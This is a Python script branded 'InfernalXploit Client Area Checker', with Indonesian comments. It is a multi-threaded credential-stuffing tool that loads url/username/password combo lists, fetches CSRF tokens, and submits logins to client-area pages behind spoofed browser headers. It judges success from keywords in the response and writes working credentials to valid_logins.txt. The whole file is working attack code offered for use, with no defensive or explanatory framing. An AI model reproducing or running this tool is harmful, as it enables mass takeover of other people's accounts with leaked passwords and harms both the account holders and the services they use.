import requests
import threading
import queue
import time
import sys
import re
from colorama import Fore, Style, init
import os
os.system('clear')
# Inisialisasi colorama
init(autoreset=True)

class ClientAreaChecker:
    def __init__(self, threads=10):
        self.threads = threads
        self.queue = queue.Queue()
        self.valid_count = 0
        self.invalid_count = 0
        self.lock = threading.Lock()
        
    def print_banner(self):
        banner = f"""
{Fore.RED}
██╗███╗   ██╗███████╗██████╗ ██████╗ ███╗   ██╗ █████╗ ██╗     ██╗     
██║████╗  ██║██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██║     ██║     
██║██╔██╗ ██║█████╗  ██████╔╝██████╔╝██╔██╗ ██║███████║██║     ██║     
██║██║╚██╗██║██╔══╝  ██╔══██╗██╔══██╗██║╚██╗██║██╔══██║██║     ██║     
██║██║ ╚████║███████╗██║  ██║██║  ██║██║ ╚████║██║  ██║███████╗███████╗
╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚══════╝
{Fore.YELLOW}Client Area Checker - InfernalXploit
{Fore.CYAN}Multi-threaded Login Validator
{Style.RESET_ALL}
        """
        print(banner)
    
    def parse_line(self, line):
        """Parse berbagai format input"""
        line = line.strip()
        if not line:
            return None, None, None
            
        # Format 1: url|user|pass
        if '|' in line:
            parts = line.split('|')
            if len(parts) >= 3:
                url = parts[0].strip()
                username = parts[1].strip()
                password = parts[2].strip()
                return url, username, password
        
        # Format 2: url:user:pass
        if ':' in line and line.count(':') >= 2 and line.startswith('http'):
            # Regex untuk memisahkan URL dari credentials
            match = re.match(r'^(https?://[^:]+):([^:]+):(.+)$', line)
            if match:
                url = match.group(1).strip()
                username = match.group(2).strip()
                password = match.group(3).strip()
                return url, username, password
        
        # Format 3: hanya URL (asumsi username dan password di line berikutnya)
        if line.startswith('http'):
            return line, None, None
            
        # Format 4: kemungkinan username atau password
        if not line.startswith('http') and '://' not in line:
            # Ini mungkin username atau password
            return None, line, None
            
        return None, None, None
    
    def load_targets(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                
            i = 0
            while i < len(lines):
                line = lines[i].strip()
                if not line:
                    i += 1
                    continue
                
                url, username, password = self.parse_line(line)
                
                # Jika ini adalah URL saja, ambil 2 baris berikutnya
                if url and username is None and i + 2 < len(lines):
                    username = lines[i + 1].strip()
                    password = lines[i + 2].strip()
                    i += 3
                    self.queue.put((url, username, password))
                # Jika sudah lengkap
                elif url and username and password:
                    i += 1
                    self.queue.put((url, username, password))
                # Jika ini adalah bagian dari credentials
                else:
                    i += 1
                    
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to load targets: {e}")
            sys.exit(1)
    
    def check_login(self, url, username, password):
        # Pastikan URL memiliki format yang benar
        if not url.startswith('http'):
            url = 'https://' + url
            
        # Prepare the login data
        login_data = {
            'username': username,
            'password': password,
            'action': 'login'
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': url,
            'Connection': 'keep-alive',
            'Referer': url,
            'Upgrade-Insecure-Requests': '1'
        }
        
        try:
            session = requests.Session()
            
            # First, get the login page to capture any tokens or cookies
            response = session.get(url, headers=headers, timeout=15)
            
            # Check for common anti-CSRF tokens
            if 'name="token"' in response.text:
                token_match = re.search(r'name="token" value="([^"]+)"', response.text)
                if token_match:
                    login_data['token'] = token_match.group(1)
            
            # Try to login
            response = session.post(url, data=login_data, headers=headers, timeout=15, allow_redirects=True)
            
            # Check if login was successful
            # Indicators of successful login
            success_indicators = [
                'logout', 'Logout', 'LOGOUT', 
                'My Services', 'Dashboard', 'Client Area',
                'Welcome,', 'Welcome back,', 'Account Overview'
            ]
            
            # Indicators of failed login
            failure_indicators = [
                'Invalid login', 'Login failed', 'Incorrect username or password',
                'Security Code Incorrect', 'The information you entered is incorrect'
            ]
            
            # Check for success indicators
            if any(indicator in response.text for indicator in success_indicators):
                return True, "Login successful"
            # Check for failure indicators
            elif any(indicator in response.text for indicator in failure_indicators):
                return False, "Invalid credentials"
            # Fallback: check HTTP status and response length
            elif response.status_code == 200 and len(response.text) > 1000:
                # If we get a large response, it might be a successful login
                return True, "Login likely successful (no clear indicators)"
            else:
                return False, "Login failed (unknown reason)"
                
        except requests.exceptions.RequestException as e:
            return False, f"Connection error: {e}"
        except Exception as e:
            return False, f"Unexpected error: {e}"
    
    def worker(self):
        while not self.queue.empty():
            try:
                url, username, password = self.queue.get_nowait()
            except queue.Empty:
                break
                
            print(f"{Fore.YELLOW}[TRY] Testing {username}:{password} on {url}")
            
            valid, message = self.check_login(url, username, password)
            
            with self.lock:
                if valid:
                    self.valid_count += 1
                    result_msg = f"{Fore.GREEN}[VALID] {username}:{password} on {url} - {message}"
                    # Save valid results to file
                    with open("valid_logins.txt", "a", encoding='utf-8') as f:
                        f.write(f"{url}|{username}|{password}\n")
                else:
                    self.invalid_count += 1
                    result_msg = f"{Fore.RED}[INVALID] {username}:{password} on {url} - {message}"
                
                print(result_msg)
            
            self.queue.task_done()
    
    def run(self, filename):
        self.print_banner()
        
        print(f"{Fore.CYAN}[INFO] Loading targets from {filename}...")
        self.load_targets(filename)
        total = self.queue.qsize()
        print(f"{Fore.CYAN}[INFO] Loaded {total} targets")
        
        print(f"{Fore.CYAN}[INFO] Starting {self.threads} threads...")
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        try:
            while any(t.is_alive() for t in threads):
                time.sleep(0.5)
                with self.lock:
                    completed = self.valid_count + self.invalid_count
                    sys.stdout.write(f"\r{Fore.CYAN}[STATUS] Progress: {completed}/{total} | Valid: {self.valid_count} | Invalid: {self.invalid_count}")
                    sys.stdout.flush()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[WARN] Interrupted by user. Stopping...")
        
        print(f"\n{Fore.GREEN}[COMPLETE] Scan completed!")
        print(f"{Fore.GREEN}[RESULTS] Valid: {self.valid_count}, Invalid: {self.invalid_count}")
        if self.valid_count > 0:
            print(f"{Fore.CYAN}[INFO] Valid logins saved to 'valid_logins.txt'")

if __name__ == "__main__":
    print(f"{Fore.CYAN}[INPUT] Enter the path to your target file: ")
    target_file = input().strip()
    
    print(f"{Fore.CYAN}[INPUT] Enter number of threads (default 10): ")
    threads_input = input().strip()
    
    try:
        threads = int(threads_input) if threads_input else 10
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Invalid thread count, using default (10)")
        threads = 10
    
    checker = ClientAreaChecker(threads=threads)
    checker.run(target_file)

